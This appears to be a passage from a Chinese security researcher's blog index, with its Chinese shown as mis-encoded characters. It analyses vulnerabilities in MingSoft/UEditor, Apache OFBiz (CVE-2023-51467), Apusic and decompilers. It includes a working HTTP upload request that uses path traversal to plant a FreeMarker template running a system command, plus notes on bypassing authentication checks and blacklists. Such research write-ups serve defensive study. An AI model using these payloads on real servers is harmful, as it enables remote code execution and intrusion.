if (pattern.indexOf(&quot;hh&quot;) != -1) &#123; return getHour(); &#125; else if (pattern.indexOf(&quot;ii&quot;) != -1) &#123; return getMinute(); &#125; else if (pattern.indexOf(&quot;ss&quot;) != -1) &#123; return getSecond(); &#125; else &#123; return pattern.indexOf(&quot;rand&quot;) != -1 ? getRandom(pattern) : pattern; &#125;&#125; æœ‰äº†è¿™ä¸ªæ€è·¯æˆ‘ä»¬ä¾¿å¯ä»¥æ„é€ å¦‚ä¸‹payloadç»•è¿‡æ ¡éªŒ 12345678910111213141516Ps:&#123;&#123;url()&#125;æ˜¯yakitçš„urlç¼–ç çš„æ ‡ç­¾POST /static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=&#123;filePathFormat:&#x27;/&#123;.&#125;./template/1/default/2&#x27;&#125;&amp;action=uploadfile HTTP/1.1Host: 127.0.0.1:8080Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Length: 362Content-Type: multipart/form-data; boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36X_Requested_With: UTF-8--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXAContent-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.txt&quot;&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -na Calculator&quot;)&#125;--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA-- V&lt;=5.3.5(ç›®å‰æœ€æ–°ç‰ˆ)é¦–å…ˆæ¥çœ‹æœ€æ–°ç‰ˆåšäº†å“ªäº›å˜åŠ¨ åœ¨æœ€å¤–å±‚åšäº†jsonConfigåˆ¤æ–­å†…å®¹(ä¼¼ä¹ä¹Ÿæ²¡ä¿®å¤ä»€ä¹ˆ) 1234567891011121314151617181920212223242526272829303132public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig) &#123; String uploadFolderPath = MSProperties.upload.path; boolean enableWeb = MSProperties.upload.enableWeb; if (!enableWeb) &#123; HashMap&lt;String, String&gt; map = new HashMap(); map.put(&quot;state&quot;, &quot;front end upload is not enabled&quot;); return JSONUtil.toJsonStr(map); &#125; else &#123; String rootPath = BasicUtil.getRealPath(uploadFolderPath); jsonConfig = jsonConfig.replace(&quot;&#123;ms.upload&#125;&quot;, &quot;/&quot; + uploadFolderPath); Map&lt;String, Object&gt; map = (Map)JSONUtil.toBean(jsonConfig, Map.class); String imagePathFormat = (String)map.get(&quot;imagePathFormat&quot;); imagePathFormat = FileUtil.normalize(imagePathFormat); String filePathFormat = (String)map.get(&quot;filePathFormat&quot;); filePathFormat = FileUtil.normalize(filePathFormat); String videoPathFormat = (String)map.get(&quot;videoPathFormat&quot;); videoPathFormat = FileUtil.normalize(videoPathFormat); map.put(&quot;imagePathFormat&quot;, imagePathFormat); map.put(&quot;filePathFormat&quot;, filePathFormat); map.put(&quot;videoPathFormat&quot;, videoPathFormat); jsonConfig = JSONUtil.toJsonStr(map); if (jsonConfig == null || !jsonConfig.contains(&quot;../&quot;) &amp;&amp; !jsonConfig.contains(&quot;..\\\\&quot;)) &#123; MsUeditorActionEnter actionEnter = new MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(&quot;&quot;)); String json = actionEnter.exec(); Map jsonMap = (Map)JSONUtil.toBean(json, Map.class); jsonMap.put(&quot;url&quot;, &quot;/&quot;.concat(uploadFolderPath).concat(jsonMap.get(&quot;url&quot;) + &quot;&quot;)); return JSONUtil.toJsonStr(jsonMap); &#125; else &#123; throw new BusinessException(BundleUtil.getString(&quot;net.mingsoft.base.resources.resources&quot;, &quot;err.error&quot;, new String[]&#123;BundleUtil.getString(&quot;net.mingsoft.basic.resources.resources&quot;, &quot;file.path&quot;, new String[0])&#125;)); &#125; &#125;&#125; ç¦æ­¢é€šè¿‡å±æ€§è¦†ç›–ä¿®æ”¹å…è®¸çš„åç¼€(æˆ‘ä¼°è®¡å¼€å‘ä»¥ä¸ºæ¨¡æ¿å¼•æ“å¿…é¡»è¦htmåç¼€æ‰è¡Œäº†ï¼Œå¿˜è®°ä»–è‡ªå·±å†™çš„å‡½æ•°æ˜¯å¯ä»¥éšæ„æŒ‡å®šåç¼€äº†2333)ï¼Œä»¥åŠæ–‡ä»¶è¯»å–ç›¸å…³å±æ€§ 12345678910111213141516171819202122232425public MsUeditorActionEnter(HttpServletRequest request, String rootPath, String jsonConfig, String configPath) &#123; super(request, rootPath); if (jsonConfig != null &amp;&amp; !jsonConfig.trim().equals(&quot;&quot;) &amp;&amp; jsonConfig.length() &gt;= 0) &#123; this.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI())); ConfigManager config = this.getConfigManager(); setValue(config, &quot;rootPath&quot;, rootPath); JSONObject _jsonConfig = new JSONObject(jsonConfig); _jsonConfig.remove(&quot;fileManagerAllowFiles&quot;); _jsonConfig.remove(&quot;imageManagerAllowFiles&quot;); _jsonConfig.remove(&quot;catcherAllowFiles&quot;); _jsonConfig.remove(&quot;imageAllowFiles&quot;); _jsonConfig.remove(&quot;fileAllowFiles&quot;); _jsonConfig.remove(&quot;videoAllowFiles&quot;); _jsonConfig.remove(&quot;imageManagerListPath&quot;); _jsonConfig.remove(&quot;fileManagerListPath&quot;); JSONObject jsonObject = config.getAllConfig(); Iterator iterator = _jsonConfig.keys(); while(iterator.hasNext()) &#123; String key = (String)iterator.next(); jsonObject.put(key, _jsonConfig.get(key)); &#125; &#125; &#125; å¼•æ“è§£ææµ‹ è®¾ç½®ç¦æ­¢åŠ è½½ä»»æ„ç±» 1cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER) ä½†è¿™æ ·å¹¶ä¸èƒ½å®Œå…¨ä¿®å¤é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒè¾…åŠ©å­¦ä¹ (https://www.cnblogs.com/escape-w/p/17326592.html)ï¼Œè™½ç„¶è¿™ä¸ªé¡¹ç›®ä¸å­˜åœ¨è¿™äº›é—®é¢˜å°±æ˜¯äº† é‚£ä¹ˆå¦‚ä½•æ‰èƒ½rceå‘¢ï¼Ÿæç¤ºä¸€ä¸‹ï¼Œæˆ‘ä»¬çŸ¥é“æ­¤æ—¶æ–‡ä»¶ä¸Šä¼ å…¶å®ä»ç„¶èƒ½å¤Ÿè·¨ç›®å½•å†™çš„ï¼Œé‚£ä¹ˆåªèƒ½ä»ç™½åå•ä¸­å—é™çš„åç¼€å…¥æ‰‹ï¼Œå‘æŒ¥ä½ çš„æƒ³è±¡ï¼Œè¿™é‡Œå°±ä¸ç›´æ¥ç»™å‡ºç­”æ¡ˆäº†","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Apache OFBizæœªæˆæƒå‘½ä»¤æ‰§è¡Œæµ…æ(CVE-2023-51467)","slug":"year/2023/12/Apache-OFBizæœªæˆæƒå‘½ä»¤æ‰§è¡Œæµ…æ-CVE-2023-51467","date":"2023-12-27T14:11:39.000Z","updated":"2024-08-04T09:01:49.768Z","comments":true,"path":"2023/12/27/year/2023/12/Apache-OFBizæœªæˆæƒå‘½ä»¤æ‰§è¡Œæµ…æ-CVE-2023-51467/","link":"","permalink":"https://y4tacker.github.io/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/","excerpt":"","text":"Apache OFBizæœªæˆæƒå‘½ä»¤æ‰§è¡Œæµ…æ(CVE-2023-51467)æœªä¿®å¤çš„æƒé™ç»•è¿‡è¿˜æ˜¯ä¹‹å‰é‚£ä¸ªé—ç•™çš„é—®é¢˜ï¼Œé¦–å…ˆæ˜¯æƒé™ç»•è¿‡ï¼Œé¦–å…ˆè¿˜æ˜¯åšä¸€ä¸ªç®€å•çš„å›é¡¾å…³äºç™»å½•çš„æ ¡éªŒåœ¨org.apache.ofbiz.webapp.control.LoginWorker#checkLoginåšå¤„ç†æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„åˆ¤æ–­é€»è¾‘éå¸¸ç®€å•ï¼Œè·³è¿‡å‰ä¸¤ä¸ªåˆ¤æ–­ï¼Œåœ¨åé¢åªéœ€è¦loginè¿”å›çš„ä¸æ˜¯errorï¼Œåˆ™ä¸ºè®¤è¯æˆåŠŸ å†æ¥çœ‹çœ‹loginçš„åˆ¤æ–­ï¼Œåœ¨è¿™é‡Œå¦‚æœunPwErrMsglistä¸ä¸ºnullåˆ™å¯ä»¥ç›´æ¥è¿”å›requirePasswordChange å› æ­¤çŸ¥é“è¿™ä¸ªå…¶å®ä½ å°±å¯ä»¥å»åå°ç‚¹ä¸€ç‚¹å°±çŸ¥é“å“ªé‡Œèƒ½RCEäº†ï¼Œä½†æ˜¯æˆ‘æ¯”è¾ƒå¥½å¥‡OFBizçš„è·¯ç”±å¤„ç†ï¼Œä¸ºä»€ä¹ˆæœ€åèƒ½è°ƒç”¨åˆ°ProgramExport.groovy è·¯ç”±å¤„ç†ä»¥åŠè§£æƒ‘åœ¨web.xmlå½“ä¸­å¯ä»¥çœ‹åˆ°ä»…æœ‰ä¸€ä¸ªServletå¤„ç†ï¼Œç»§ç»­è·Ÿå…¥org.apache.ofbiz.webapp.control.ControlServlet ä»¥doGETä¸ºä¾‹ï¼Œå¿½ç•¥ä¸€äº›æ— å…³çš„é€»è¾‘ï¼Œæœ€ç»ˆéƒ½æ˜¯é€šè¿‡handler.doRequeståšè¯·æ±‚çš„å¤„ç† åœ¨è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹çœ‹handlerçš„è·å–å¤„ç†ï¼Œé¦–å…ˆåœ¨servletçš„åˆå§‹åŒ–è¿‡ç¨‹å°±è¿›è¡Œäº†åˆå§‹åŒ–æ“ä½œ 123456789101112@Overridepublic void init() throws ServletException &#123; ServletContext ctx = getServletContext(); if (Debug.infoOn()) &#123; String path = ctx.getContextPath(); String webappName = path.isEmpty() ? path : path.substring(1); Debug.logInfo(&quot;Loading webapp [&quot; + webappName + &quot;], located at &quot; + ctx.getRealPath(&quot;/&quot;), module); &#125; // Initialize the request handler. RequestHandler.getRequestHandler(ctx);&#125; å¯ä»¥çœ‹åˆ°ä»£ç è™½ç„¶ä¸å°‘ï¼Œä½†å…¶å®å°±æ˜¯ä»/WEB-INF/controller.xmlä¸‹è·å–äº†è·¯ç”±çš„é…ç½®ï¼Œå¹¶æ ¹æ®é…ç½®æ–‡ä»¶åˆå§‹åŒ–äº†ä¸¤ä¸ªå·¥å‚ç±»ViewFactory/EventFactory 123456789101112131415161718192021222324252627282930313233343536373839404142public static RequestHandler getRequestHandler(ServletContext servletContext) &#123; RequestHandler rh = (RequestHandler) servletContext.getAttribute(&quot;_REQUEST_HANDLER_&quot;); if (rh == null) &#123; rh = new RequestHandler(servletContext); servletContext.setAttribute(&quot;_REQUEST_HANDLER_&quot;, rh); &#125; return rh;&#125;private RequestHandler(ServletContext context) &#123; // init the ControllerConfig, but don&#x27;t save it anywhere, just load it into the cache this.controllerConfigURL = ConfigXMLReader.getControllerConfigURL(context); try &#123; ConfigXMLReader.getControllerConfig(this.controllerConfigURL); &#125; catch (WebAppConfigurationException e) &#123; // FIXME: controller.xml errors should throw an exception. Debug.logError(e, &quot;Exception thrown while parsing controller.xml file: &quot;, module); &#125; this.viewFactory = new ViewFactory(context, this.controllerConfigURL); this.eventFactory = new EventFactory(context, this.controllerConfigURL); this.trackServerHit = !&quot;false&quot;.equalsIgnoreCase(context.getInitParameter(&quot;track-serverhit&quot;)); this.trackVisit = !&quot;false&quot;.equalsIgnoreCase(context.getInitParameter(&quot;track-visit&quot;)); hostHeadersAllowed = UtilMisc.getHostHeadersAllowed();&#125;public static ControllerConfig getControllerConfig(WebappInfo webAppInfo) throws WebAppConfigurationException, MalformedURLException &#123; Assert.notNull(&quot;webAppInfo&quot;, webAppInfo); String filePath = webAppInfo.getLocation().concat(controllerXmlFileName); File configFile = new File(filePath); return getControllerConfig(configFile.toURI().toURL());&#125;public static ControllerConfig getControllerConfig(URL url) throws WebAppConfigurationException &#123; ControllerConfig controllerConfig = controllerCache.get(url); if (controllerConfig == null) &#123; controllerConfig = controllerCache.putIfAbsentAndGet(url, new ControllerConfig(url)); &#125; return controllerConfig;&#125; æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­çœ‹org.apache.ofbiz.webapp.control.RequestHandler#doRequest,é¦–å…ˆæ ¹æ®è¯·æ±‚è·¯å¾„è·å–å¯¹åº”å¤„ç†çš„RequestMap æ¥ç€é¦–å…ˆæ˜¯ä¸€äº›é¢„å¤„ç†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±çœ‹çœ‹ ç»§ç»­å¾€ä¸‹ï¼Œä¹‹ååœ¨æ­£å¼å¤„ç†å‰ä¼šèµ°åˆ°æˆ‘ä»¬ç†Ÿæ‚‰çš„ç™»å½•æ ¡éªŒç”±äºç¬¬ä¸€éƒ¨åˆ†å·²ç»ç®€å•åšäº†åˆ†æï¼Œè¿™é‡Œå°±ä¸å†é‡å¤ ä¹‹åæ ¹æ®è¿”å›ç»“æœé€‰æ‹©å¯¹åº”çš„responseï¼Œä¸Šé¢ä¹Ÿæåˆ°è¿‡requestMapä¸uriæœ‰å…³ï¼ŒåŒæ ·responseè¿™éƒ¨åˆ†ä¸uriä»¥åŠtypeæœ‰å…³ 12345&lt;request-map uri=&quot;ProgramExport&quot;&gt; &lt;security https=&quot;true&quot; auth=&quot;true&quot;/&gt; &lt;response name=&quot;success&quot; type=&quot;view&quot; value=&quot;ProgramExport&quot;/&gt; &lt;response name=&quot;error&quot; type=&quot;view&quot; value=&quot;ProgramExport&quot;/&gt;&lt;/request-map&gt; æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ°è¿™é‡Œæ ¹æ®nextRequestResponse.typeçš„ç§ç±»æ‰§è¡Œï¼Œå’Œæˆ‘ä»¬è¯·æ±‚çš„è·¯å¾„åœ¨xmlä¸­å¯¹åº”çš„é…ç½®æœ‰å…³ï¼Œåœ¨è¿™é‡Œç”±äºæˆ‘ä»¬æ˜¯viewå› æ­¤èµ°å…¥elseæ‰§è¡Œåç½®å¤„ç†å™¨ æœ€ç»ˆæ‰§è¡Œè§†å›¾æ¸²æŸ“çš„å¤„ç†ï¼Œä¹‹åçš„å¤„ç†æ„Ÿå…´è¶£å°±è‡ªå·±è·Ÿè·Ÿ è€Œæˆ‘ä»¬åå°æ¼æ´çš„åˆ©ç”¨ç‚¹ProgramExport,å¯¹åº”è§†å›¾å¦‚ä¸‹ 1&lt;view-map name=&quot;ProgramExport&quot; type=&quot;screen&quot; page=&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;/&gt; å› æ­¤ä¹Ÿä¸éš¾ç†è§£ä¸ºä»€ä¹ˆé€šè¿‡è·¯ç”±æœ€ç»ˆèƒ½è°ƒç”¨ProgramExport.groovyçš„å¤„ç†äº† åˆ©ç”¨æ—¶å€¼å¾—æ³¨æ„çš„ç‚¹åœ¨ç›´æ¥åˆ©ç”¨æ—¶ä½ ä¼šå‘ç°åœ¨æŸäº›ç‰ˆæœ¬ä¸‹æ— æ³•æ‰“æˆåŠŸï¼Œå…¶å®æ˜¯å› ä¸ºè¿™é‡Œåšäº†ä¸€äº›ç®€å•çš„æ£€æŸ¥ è¿™é‡Œæœ‰ä¸€äº›ç¦æ­¢ä½¿ç”¨çš„token å¯ä»¥çœ‹åˆ°è¿™ä¸ªé…ç½®æ¥æºäºé…ç½®æ–‡ä»¶ çœ‹åˆ°æ‹¦æˆªçš„å†…å®¹ç®€ç›´æŠ½è±¡ï¼Œä¸çŸ¥é“ä»å“ªé‡ŒæŠ„æ¥çš„â€¦ä¸å¤šåæ§½ï¼Œç»•è¿‡ä¹Ÿå¾ˆç®€å•ï¼Œé»‘åå•é‡Œçš„é™åˆ¶å¹¶ä¸å¤šå¾ˆå®¹æ˜“é€šè¿‡ä»£ç å±‚é¢bypassï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨unicodeç¼–ç æ›´ç›´ç™½ Ps:å½“ç„¶è¿˜æœ‰å¦ä¸€ä¸ªCVEæ˜¯å…³äºSSRFä»¥åŠä»»æ„é…ç½®è¯»å–çš„åˆ©ç”¨ç‚¹ä¹Ÿå¯ä»¥è‡ªå·±ç¿»ç¿»åå°åŠŸèƒ½ï¼Œè¿™é‡Œä¸å¤šåšåˆ†æäº† å‚è€ƒé“¾æ¥Apache OFBizæ¼æ´ CVE-2023-49070 çš„å‰ä¸–ä»Šç”Ÿ","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apache","slug":"Apache","permalink":"https://y4tacker.github.io/tags/Apache/"}]},{"title":"Apusicæƒé™ç»•è¿‡æµ…æ","slug":"year/2023/12/Apusicæƒé™ç»•è¿‡æµ…æ","date":"2023-12-26T12:44:38.000Z","updated":"2024-08-04T09:01:49.791Z","comments":true,"path":"2023/12/26/year/2023/12/Apusicæƒé™ç»•è¿‡æµ…æ/","link":"","permalink":"https://y4tacker.github.io/2023/12/26/year/2023/12/Apusic%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/","excerpt":"","text":"Apusicæƒé™ç»•è¿‡æµ…æçœŸçš„æ˜¯æµ…æå‰å‡ å¤©å»å‚åŠ è¡¥å¤©äº†ï¼Œä¸€ç›´æƒ³å†™ä½†æ˜¯ä¸€ç›´æŠ½ä¸å‡ºæ—¶é—´å­¦ä¹ ï¼Œç”±äºæ¼æ´æ¯”è¾ƒç®€å•è¿™é‡Œä¹Ÿä¸è¿‡å¤šç¯‡å¹…çš„è®²è§£ï¼Œä»…åˆ†äº«ä¸€äº›å…³é”®çš„ç‚¹ï¼Œåœ¨è¿™é‡Œå…³äºæƒé™æ ¡éªŒApusicæ²¡æœ‰ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¡†æ¶(æ¯•ç«Ÿæ˜¯è¿«çœŸä¿¡åˆ›äº§å“) è€Œæ˜¯ä½¿ç”¨äº†è‡ªå®šä¹‰å®ç°çš„å®‰å…¨æ€§çº¦æŸ(å…³äºä»€ä¹ˆå®‰å…¨æ€§çº¦æŸç™¾åº¦æœå¾ˆå¤šæ–‡ç« äº†ä¸ä½œæ¬è¿å·¥)å»å®ç°äº†è®¿é—®æ§åˆ¶ 1234567891011&lt;security-constraint&gt; &lt;display-name&gt;test&lt;/display-name&gt; &lt;web-resource-collection&gt; &lt;web-resource-name&gt;protect&lt;/web-resource-name&gt; &lt;url-pattern&gt;/protect&lt;/url-pattern&gt; &lt;url-pattern&gt;/protect/*&lt;/url-pattern&gt; &lt;/web-resource-collection&gt; &lt;auth-constraint&gt; &lt;role-name&gt;admin&lt;/role-name&gt; &lt;/auth-constraint&gt;&lt;/security-constraint&gt; é€šè¿‡è¿«çœŸçš„ç®€å•debugè¿‡åï¼Œå‘ç°åœ¨com.apusic.web.container.ServletInvocation#preRequestå¯¹security-constraintåšäº†æ£€æŸ¥ è·³è¿‡åƒåœ¾æ—¶é—´(æ‡’)ï¼Œä»£ç å¦‚ä¸‹å¾ˆç®€å•ï¼Œåœ¨è¿™é‡Œè°ƒç”¨äº†checkResourcePermissionå»åšæƒé™çš„æ£€æŸ¥ 12345public boolean checkResourcePermission(HttpServletRequest req) &#123; WebResourcePermission perm = new WebResourcePermission(req); Principal principal = Security.getCurrentUser(); return this.checkPermission(perm, principal);&#125; åœ¨è¿™é‡Œï¼Œé€šè¿‡javax.security.jacc.WebResourcePermissionå»å®ç°äº†æƒé™çš„æ£€æŸ¥ é¦–å…ˆåœ¨åˆå§‹åŒ–WebResourcePermissionä¸­ï¼Œå…ˆå°†requestå¯¹è±¡ç»è¿‡getUriMinusContextPathå¤„ç†åä¼ å…¥çˆ¶ç±»ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°uriæ˜¯é€šè¿‡request.getRequestURI()å»è·å–ä¹‹åå»é™¤äº†ä¸Šä¸‹æ–‡è·¯å¾„ 1234567891011121314151617181920212223242526public WebResourcePermission(HttpServletRequest request) &#123; super(getUriMinusContextPath(request)); this.urlPatternSpec = new URLPatternSpec(super.getName()); this.methodSpec = HttpMethodSpec.getSpec(request.getMethod());&#125;private static String getUriMinusContextPath(HttpServletRequest request) &#123; String uri = request.getRequestURI(); if (uri != null) &#123; String contextPath = request.getContextPath(); int contextLength = contextPath == null ? 0 : contextPath.length(); if (contextLength &gt; 0) &#123; uri = uri.substring(contextLength); &#125; if (uri.equals(&quot;/&quot;)) &#123; uri = &quot;&quot;; &#125; else &#123; uri = uri.replaceAll(&quot;:&quot;, &quot;%3A&quot;); &#125; &#125; else &#123; uri = &quot;&quot;; &#125; return uri;&#125; è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°å…¶å®å°±æ˜¯å°†å¤„ç†å¥½çš„urièµ‹å€¼ç»™name å›åˆ°WebResourcePermissionçš„æ„é€ å‡½æ•°ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå¯¹ä¸Šé¢è¿™ä¸ªnameä»¥åŠè¯·æ±‚æ–¹æ³•åšäº†èµ‹å€¼ï¼Œåˆ°æ­¤æ„é€ å‡½æ•°éƒ¨åˆ†æ‰§è¡Œå®Œæ¯• 12this.urlPatternSpec = new URLPatternSpec(super.getName());this.methodSpec = HttpMethodSpec.getSpec(request.getMethod()); æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡com.apusic.web.container.ConstraintMapper#checkPermissionå»åšæƒé™æ ¡éªŒäº†ï¼Œæœ€ç»ˆä¼šèµ°åˆ°javax.security.jacc.WebResourcePermission#implieså¤„ç† æœ‰å…´è¶£çš„å¯ä»¥çœ‹çœ‹ä»checkResourcePermissionåˆ°implies:358ä¹‹é—´çš„è°ƒç”¨æ ˆ 12345678910implies:358, WebResourcePermission (javax.security.jacc)implies:525, PermissionsHash (java.security)implies:182, Permissions (java.security)implies:48, ApplicationPolicy (com.apusic.security.jacc)implies:58, ServerPolicy (com.apusic.security.jacc)checkPermission:272, ConstraintMapper (com.apusic.web.container)checkResourcePermission:255, ConstraintMapper (com.apusic.web.container)checkResourcePermission:1565, WebContainer (com.apusic.web.container)checkSecurityConstraint:310, ServletInvocation (com.apusic.web.container)preRequest:228, ServletInvocation (com.apusic.web.container) å›åˆ°æ­£é¢˜ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™éƒ¨åˆ†çš„å¤„ç†ä¹Ÿå¾ˆç®€å•ï¼Œä¸€ä¸ªæ˜¯å¯¹æ–¹æ³•çš„åˆ¤æ–­ï¼Œä¸€ä¸ªæ˜¯å¯¹urlçš„åˆ¤æ–­ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åè€…å³å¯ ç»§ç»­å¾€ä¸‹èµ°æœ€ç»ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„æ¯”å¯¹é€»è¾‘ï¼Œä¹Ÿå¾ˆç®€å•ä»¥/protect/*ä¸ºä¾‹å­ patternæ˜¯å¦ç­‰äºpath patterå¦‚æœä»¥/å¼€å¤´/*ç»“å°¾ï¼Œå»é™¤åä¸¤ä½å(/protect)å¦‚æœé•¿åº¦ä¸º0ä¹Ÿå°±æ˜¯ä»…ä¸º/*åˆ™è¿”å›trueï¼Œåä¹‹åˆ¤æ–­pathæ˜¯å¦ä¸º/protectæˆ–è€…ä»¥/protectå¼€å¤´ 1234567891011121314151617181920if (pattern.equals(path)) &#123; return true;&#125; else &#123; int slash; if (pattern.startsWith(&quot;/&quot;) &amp;&amp; pattern.endsWith(&quot;/*&quot;)) &#123; pattern = pattern.substring(0, pattern.length() - 2); slash = pattern.length(); if (slash == 0) &#123; return true; &#125; else &#123; return path.startsWith(pattern) &amp;&amp; (path.length() == slash || path.substring(slash).startsWith(&quot;/&quot;)); &#125; &#125; else if (pattern.startsWith(&quot;*.&quot;)) &#123; slash = path.lastIndexOf(47); int period = path.lastIndexOf(46); return slash &gt;= 0 &amp;&amp; period &gt; slash &amp;&amp; path.endsWith(pattern.substring(1)); &#125; else &#123; return pattern.equals(DEFAULT_PATTERN); &#125;&#125; æƒé™ç»•è¿‡æ„é€ åœ¨è¿™é‡Œæˆ‘ä»¬å…³æ³¨å‡ ä¸ªç»†èŠ‚ä¸€ä¸ªæ˜¯urlçš„å¤„ç†æ˜¯é€šè¿‡request.getRequestURI()å¤„ç†é‚£ä¹ˆåœ¨è¿™é‡Œä¸ä¼šåšurlè§£ç ï¼Œåœ¨è¿™é‡Œå¯ä»¥ä½œä¸ºä¸€ä¸ªç»•è¿‡çš„ç‚¹ å¦ä¸€ä¸ªç»†èŠ‚ä»libå½“ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°springçš„ç‰ˆæœ¬æ˜¯è¿œå¤ç‰ˆæœ¬ï¼Œå› æ­¤alwaysUseFullPathä¸ºfalseï¼Œå› æ­¤æ˜¯ä¼šåšå½’ä¸€åŒ–å†å»åšè·¯ç”±åŒ¹é… é‚£ä¹ˆç»“åˆè¿™ä¸¤ä¸ªç‚¹æˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºéå¸¸å¤šçš„ç»•è¿‡å§¿åŠ¿ï¼Œåœ¨è¿™é‡Œå°±ä¸åˆ—ä¸¾äº† è‡³äºRCEçš„ç‚¹é‚£å°±æ›´å¤šäº†ï¼Œå¯è‡ªè¡Œå‘ç°ï¼Œæºç å¾ˆç®€å•","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Apusic","slug":"Apusic","permalink":"https://y4tacker.github.io/tags/Apusic/"}]},{"title":"Hacking FernFlower","slug":"year/2023/12/Hacking-FernFlower","date":"2023-12-22T13:16:04.000Z","updated":"2024-08-04T09:01:49.808Z","comments":true,"path":"2023/12/22/year/2023/12/Hacking-FernFlower/","link":"","permalink":"https://y4tacker.github.io/2023/12/22/year/2023/12/Hacking-FernFlower/","excerpt":"","text":"Hacking FernFlowerå‰è¨€â€‹ ä»Šå¤©å¾ˆå¼€å¿ƒï¼Œç¬¬ä¸€æ¬¡ä½œä¸ºspeakerå‚ä¸äº†è®®é¢˜çš„åˆ†äº«ï¼Œä¹Ÿå¾ˆæ„Ÿè°¢è¡¥å¤©ç™½å¸½å¤§ä¼šç»™äº†æˆ‘è¿™æ ·çš„ä¸€æ¬¡æœºä¼š â€‹ å…¶å®æœ¬è¯¥åœ¨å»å¹´æ¥è®²Javaæ··æ·†çš„è®®é¢˜ï¼Œä¸è¿‡å½“æ—¶èµ¶ä¸Šç–«æƒ…çˆ†å‘ï¼Œå­¦æ ¡å‡ºäºå®‰å…¨çš„è€ƒè™‘æ²¡è®©å‡ºçœã€‚åœ¨å½“æ—¶æˆ‘æ›´æƒ³åˆ†äº«çš„æ˜¯å¯¹æŠ—æ‰€æœ‰åæ··æ·†çš„å·¥å…·cfrã€procyonï¼Œä½†ä»Šå¹´åœ¨å‡†å¤‡è¿‡ç¨‹ä¸­å‘ç°ä¸»é¢˜å¤ªå¤§äº†å…¶å®ä¸å¤ªå¥½è®²ï¼Œå†è€ƒè™‘åˆ°å—ä¼—éƒ½æ˜¯åšwebå®‰å…¨çš„ï¼Œå› æ­¤æˆ‘æœ€ç»ˆè¿˜æ˜¯å°†ä¸»é¢˜å®šä¸ºäº†å¯¹æŠ—åç¼–è¯‘å·¥å…·ï¼Œåœ¨è¿™é‡Œé€‰äº†ä¸€äº›æ–¹ä¾¿å¤§å®¶ç†è§£çš„ä¾‹å­æ¥ä»‹ç»æ··æ·†ï¼Œä¸»è¦æ˜¯æƒ³åˆ†äº«ä¸€äº›ä¸ä¸€æ ·çš„æ€è·¯å§ã€‚ â€‹ åœ¨è¿™æ¬¡è®®é¢˜å½“ä¸­æˆ‘ä»…ä»…åˆ†äº«äº†éƒ¨åˆ†è¾ƒä¸ºç®€å•çš„æ··æ·†æ–¹å¼ï¼Œä½†ä»–ä»¬å´å¾ˆç›´è§‚æ˜“æ‡‚ï¼Œå¦‚æœä½ æƒ³è¦æ›´æ·±å…¥çš„å»åšæ›´é«˜éš¾åº¦çš„æ··æ·†ï¼Œè¿˜å¯ä»¥å°è¯•å¯¹ä¹¦ç±æ·±å…¥ç†è§£JAVAè™šæ‹Ÿæœºåšä¸€äº›ç®€å•çš„é˜…è¯»ã€‚ â€‹ åœ¨è¿™ç¯‡æ–‡ç« 